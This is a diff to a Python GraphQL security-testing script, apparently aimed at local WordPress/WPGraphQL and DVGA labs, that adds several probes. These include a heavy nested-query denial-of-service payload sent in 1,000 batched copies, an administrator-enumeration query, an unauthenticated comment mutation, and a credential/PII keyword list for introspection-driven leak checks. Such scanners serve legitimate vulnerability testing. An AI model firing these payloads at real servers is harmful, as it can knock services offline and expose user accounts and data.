@@ -21,13 +21,14 @@ def print_banner():
     print("This tool tests various GraphQL security vulnerabilities on specified endpoints.\n")
 
 
-# GRAPHQL_URL = "http://localhost:5013/graphql"
+# GRAPHQL_URL = "http://127.0.0.1:31337/index.php?graphql"
 
 # Define the GraphQL endpoint URL
 def load_endpoints(filename):
     with open(filename, "r") as file:
         for line in file:
             yield json.loads(line)['url']
+
 
 def print_red(text):
     print("\033[91m{}\033[0m".format(text))
@@ -75,13 +76,13 @@ def test_dos_attack():
         for i in range(100):  
             response = requests.post(GRAPHQL_URL, json={"query": query})
             status_codes.append(response.status_code)
-        print_green("[+] DoS attack test status codes: {}".format(status_codes))
+        print("[+] DoS attack test status codes: {}".format(status_codes))
         if 200 not in status_codes:
-            print_green("[+] DoS attack test successful.")
+            print_red("[+] Potential DoS attack test vulnerability. Check status codes above.")
         else:
-            print_red("[-] DoS attack test failed: Server responded with 200 status code.")
+            print_green("[-] DoS attack test failed: Server responded with 200 status code.")
     except Exception as e:
-        print_red("[-] DoS attack test failed: {}".format(e))
+        print_green("[-] DoS attack test failed: {}".format(e))
 
 def test_alias_attack():
     query_list = []
@@ -96,14 +97,14 @@ def test_alias_attack():
         for i in range(100):  
             response = requests.post(GRAPHQL_URL, json={"query": query})
             status_codes.append(response.status_code)
-        print_green("[+] Alias-based attack test status codes: {}".format(status_codes))
+        print("[+] Alias-based attack test status codes: {}".format(status_codes))
         if 200 not in status_codes:
-            print_green("[+] Alias-based attack test successful.")
+           print_red("[+] Alias-based attack test successful.")
         else:
-            print_red("[-] Alias-based attack test failed: Server responded with 200 status code.")
+           print_green("[-] Alias-based attack test failed: Server responded with 200 status code.")
 
     except Exception as e:
-        print_red("[-] Alias-based attack test failed: {}".format(e))
+        print_green("[-] Alias-based attack test failed: {}".format(e))
 
 def test_sensitive_data():
     sensitive_fields = [
@@ -276,6 +277,217 @@ def test_introspection():
     except ValueError:
         print_red("Failed to decode JSON from response.")
 
+def test_getUsers():
+    getUsers_query = {
+        'query': '''
+        query getUsers{
+          users(where:{role:ADMINISTRATOR}){
+            edges{
+              node{
+                userId
+                name
+              }
+            }
+          }
+        }
+        '''
+    }
+
+    try:
+        response = requests.post(GRAPHQL_URL, json=getUsers_query)
+        response.raise_for_status()
+        response_json = response.json()
+
+        if 'data' in response_json and 'users' in response_json['data']:
+            print_green("[+] getUsers testcase successfully executed.")
+            print("Response:", json.dumps(response_json, indent=4))
+        else:
+            print_red("[-] getUsers testcase failed.")
+    except Exception as e:
+        print("Error during getUsers testcase execution:", e)
+
+def test_denialOfService(url):
+    FORCE_MULTIPLIER = 10000
+    CHAINED_REQUESTS = 1000
+
+    queries = []
+
+    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
+    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}
+
+    for _ in range(0, CHAINED_REQUESTS):
+        queries.append(query)
+
+    r = requests.post(url, json=queries)
+    print_green("[+] denialOfService testcase successfully executed.")
+    print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
+    # print('Response:', r.json())
+
+def post_comment(url, headers, postID, userID, comment, verbose=False):
+    payload = {
+        "query": """
+            mutation {
+                createComment(input: {
+                    postId: %d,
+                    userId: %d,
+                    content: "%s",
+                    clientMutationId: "UWHATM8",
+                }) {
+                    clientMutationId
+                }
+            }
+        """ % (int(postID), int(userID), comment)
+    }
+    
+    try:
+        response = requests.post(url, data=json.dumps(payload), headers=headers)
+        if response.status_code == 200 and 'UWHATM8' in response.text:
+            print_green("[+] Comment posted on article ID")
+        else:
+            print_red("\n[-] Error posting the comment. Check that postID and userID are correct")
+
+        if verbose:
+            print(response.text)
+
+            return
+    except Exception as e:
+        print_red("\n[-] An error occurred while posting the comment")
+
+        return
+    
+def test_unauthorized_comment():
+    headers = {
+        'Content-Type': 'application/json',
+    }
+    postID = "1" 
+    userID = "2" 
+    comment = "This is a test comment."  # Comment to be posted
+    post_comment(url, headers, postID, userID, comment, verbose=True)
+
+# checks the server's ability to handle multiple, resource-intensive queries
+def test_batching_attack():
+    batch_queries = [{'query': '{ users { id, posts { id, title, comments { id, content } } } }'} for _ in range(50)]
+    try:
+        response = requests.post(GRAPHQL_URL, json=batch_queries)
+        if response.status_code == 200:
+            print_red("[!] Batching attack may be possible. Server responded with 200 OK.")
+        else:
+            print_green("[-] Batching attack mitigated. Response status: {}".format(response.status_code))
+    except Exception as e:
+        print_red("[-] Batching attack test failed: {}".format(e))
+
+def test_field_limiting():
+    # Attempt to request an excessive number of fields
+    query = 'query { user { ' + ' '.join(f'field{i}' for i in range(1000)) + ' } }'
+    try:
+        response = requests.post(GRAPHQL_URL, json={"query": query})
+        if response.status_code == 400 and 'too many fields' in response.text.lower():
+            print_green("[+] Field limiting is enforced.")
+        else:
+            print_red("[-] No field limiting detected, potential vulnerability.")
+    except Exception as e:
+        print_red(f"[-] Field limiting test failed: {e}")
+
+
+def test_unauthorized_mutation():
+    mutation = 'mutation { updatePost(id: "1", data: { title: "New Title" }) { title } }'
+    try:
+        response = requests.post(GRAPHQL_URL, json={"query": mutation})
+        if response.status_code in [200, 201] and "title" in response.json().get('data', {}):
+            print_red("[!] Unauthorized mutation may be possible.")
+        else:
+            print_green("[-] Mutation properly restricted.")
+    except Exception as e:
+        print_red(f"[-] Mutation test failed: {e}")
+
+
+def test_sensitive_data_dynamically(url, schema):
+    """ Dynamically test for sensitive data based on schema introspection. """
+    sensitive_keywords = [
+        'password', 'passcode', 'passwd', 'pin', 'creditcard', 'ccnumber', 'cardnum', 'ssn', 'socialsecuritynumber', 
+        'secret', 'token', 'apikey', 'api_key', 'accesstoken', 'access_token', 'auth', 'authentication', 'credentials',
+        'privatekey', 'private_key', 'secretkey', 'secret_key', 'encryptionkey', 'encryption_key', 
+        'bank', 'accountnumber', 'account_num', 'routingnumber', 'routing_num', 'financial', 
+        'salary', 'birthdate', 'birthplace', 'passportnumber', 'passport_num', 'driverlicense', 'driver_license_num',
+        'address', 'email', 'phone', 'phonenumber', 'mobile', 'cell', 'contact', 'zip', 'postal', 'postcode', 
+        'signature', 'profile', 'ssn', 'dni', 'nationalid', 'national_id', 'taxid', 'tax_id', 'health', 'insurance',
+        'beneficiary', 'beneficiary_id', 'custodian', 'guardian', 'sessionid', 'session_id', 'cookie', 'authentication_token'
+    ]
+
+    sensitive_fields = []
+
+    # Identify potentially sensitive fields from the schema
+    for type_info in schema:
+        if type_info.get('fields'):
+            for field in type_info['fields']:
+                if any(keyword in field['name'].lower() for keyword in sensitive_keywords):
+                    sensitive_fields.append(f"{type_info['name']}{{ {field['name']} }}")
+
+    # Test each sensitive field found
+    print("Running dynamic sensitive data tests...")
+    for query in sensitive_fields:
+        try:
+            response = requests.post(url, json={'query': '{ ' + query + ' }'}, headers={'Content-Type': 'application/json'})
+            if response.status_code == 200 and response.json().get('data'):
+                print_red(f"[!] Sensitive data leak detected in field: {query}")
+                print("Evidence:", json.dumps(response.json(), indent=4))
+            else:
+                print_green(f"[-] No sensitive data leak detected in field: {query}")
+        except Exception as e:
+            print("Error during sensitive data test:", e)
+
+def get_nested_fields(field, depth=0, max_depth=2):
+    """ Recursively get nested fields if the field is of type OBJECT. """
+    if depth > max_depth:
+        return ""
+    fields = ""
+    if field.get('type').get('kind') == 'OBJECT':
+        nested_fields = field['type'].get('fields', [])
+        for nested_field in nested_fields:
+            fields += f"{nested_field['name']} {get_nested_fields(nested_field, depth + 1, max_depth)}, "
+    elif field.get('type').get('kind') == 'NON_NULL' or field.get('type').get('kind') == 'LIST':
+        return get_nested_fields({'type': field['type']['ofType']}, depth, max_depth)
+    return fields
+
+def fetch_schema(url):
+    """ Fetch the GraphQL schema via introspection. """
+    introspection_query = {
+        "query": """
+        query IntrospectionQuery {
+            __schema {
+                queryType { name }
+                mutationType { name }
+                subscriptionType { name }
+                types {
+                    name
+                    fields {
+                        name
+                        type {
+                            name
+                            kind
+                            ofType {
+                                name
+                                kind
+                            }
+                        }
+                    }
+                }
+                directives {
+                    name
+                }
+            }
+        }
+        """
+    }
+    try:
+        response = requests.post(url, json=introspection_query, headers={'Content-Type': 'application/json'})
+        response.raise_for_status()
+        return response.json()['data']['__schema']['types']
+    except Exception as e:
+        print_red(f"Failed to fetch schema: {e}")
+        return []
+    
+
 if __name__ == "__main__":
     print_banner()
     choice = input("Do you want to enter an endpoint manually or use a JSON file? Enter 'manual' or 'json': ").strip().lower()
@@ -291,9 +503,15 @@ if __name__ == "__main__":
         exit()
 
     for url in endpoints:
+        GRAPHQL_URL = url
         print(f"Running test cases on {url}...")
+        schema = fetch_schema(url)
+        if schema:
+            print_red("Successfully fetched schema.")
+            test_sensitive_data_dynamically(url, schema)
+        else:
+            print_red("Failed to dynamically tests bugs due to instrospection disabled.")
         test_introspection()
-        check_resource_request(url)
         test_dos_attack()
         test_alias_attack()
         test_sensitive_data()
@@ -302,61 +520,67 @@ if __name__ == "__main__":
         test_sql_injection()
         test_path_traversal()
         test_permissions()
-        
-        test_capitalize_field_argument()
-        test_show_network_directive()
-        test_mutation_login_success()
-        test_mutation_login_error()
-        test_query_me()
-        test_query_me_operator()
-        test_batching()
-        test_batched_operation_names()
-        test_check_graphiql_cookie()
-        test_check_batch_disabled()
-        test_check_batch_enabled()
-        test_dvga_is_up()
-        test_graphql_endpoint_up()
-        test_graphiql_endpoint_up()
-        test_check_introspect_fields()
-        test_check_introspect_when_expert_mode()
-        test_check_introspect_mutations()
-        test_check_hardened_mode()
-        test_check_easy_mode()
-        test_mutation_createPaste()
-        test_mutation_editPaste()
-        test_mutation_deletePaste()
-        test_mutation_uploadPaste()
-        test_mutation_importPaste()
-        test_mutation_createUser()
-        test_mutation_createBurnPaste()
-        test_query_pastes()
-        test_query_paste_by_id()
-        test_query_systemHealth()
-        test_query_systemUpdate()
-        test_query_systemDebug()
-        test_query_users()
-        test_query_users_by_id()
-        test_query_read_and_burn()
-        test_query_search_on_user_object()
-        test_query_search_on_paste_object()
-        test_query_search_on_user_and_paste_object()
-        test_query_audits()
-        test_query_audits()
-        test_query_pastes_with_limit()
-        test_query_pastes_with_fragments()
-        test_check_rollback()
-        test_circular_query_pastes_owners()
-        test_aliases_overloading()
-        test_field_suggestions()
-        test_os_injection()
-        test_os_injection_alt()
-        test_xss()
-        test_log_injection()
-        test_html_injection()
-        test_sql_injection()
-        test_deny_list_expert_mode()
-        test_deny_list_expert_mode_bypass()
-        test_deny_list_beginner_mode()
-        test_circular_fragments()
-        test_stack_trace_errors()
-        test_check_websocket()
+        test_getUsers()
+        test_unauthorized_comment()
+        test_batching_attack()
+        test_field_limiting()
+        test_unauthorized_mutation()
+
+
+        # test_capitalize_field_argument()
+        # test_show_network_directive()
+        # test_mutation_login_success()
+        # test_mutation_login_error()
+        # test_query_me()
+        # test_query_me_operator()
+        # test_batching()
+        # test_batched_operation_names()
+        # test_check_graphiql_cookie()
+        # test_check_batch_disabled()
+        # test_check_batch_enabled()
+        # test_dvga_is_up()
+        # test_graphql_endpoint_up()
+        # test_graphiql_endpoint_up()
+        # test_check_introspect_fields()
+        # test_check_introspect_when_expert_mode()
+        # test_check_introspect_mutations()
+        # test_check_hardened_mode()
+        # test_check_easy_mode()
+        # test_mutation_createPaste()
+        # test_mutation_editPaste()
+        # test_mutation_deletePaste()
+        # test_mutation_uploadPaste()
+        # test_mutation_importPaste()
+        # test_mutation_createUser()
+        # test_mutation_createBurnPaste()
+        # test_query_pastes()
+        # test_query_paste_by_id()
+        # test_query_systemHealth()
+        # test_query_systemUpdate()
+        # test_query_systemDebug()
+        # test_query_users()
+        # test_query_users_by_id()
+        # test_query_read_and_burn()
+        # test_query_search_on_user_object()
+        # test_query_search_on_paste_object()
+        # test_query_search_on_user_and_paste_object()
+        # test_query_audits()
+        # test_query_audits()
+        # test_query_pastes_with_limit()
+        # test_query_pastes_with_fragments()
+        # test_check_rollback()
+        # test_circular_query_pastes_owners()
+        # test_aliases_overloading()
+        # test_field_suggestions()
+        # test_os_injection()
+        # test_os_injection_alt()
+        # test_xss()
+        # test_log_injection()
+        # test_html_injection()
+        # test_sql_injection()
+        # test_deny_list_expert_mode()
+        # test_deny_list_expert_mode_bypass()
+        # test_deny_list_beginner_mode()
+        # test_circular_fragments()
+        # test_stack_trace_errors()
+        # test_check_websocket()
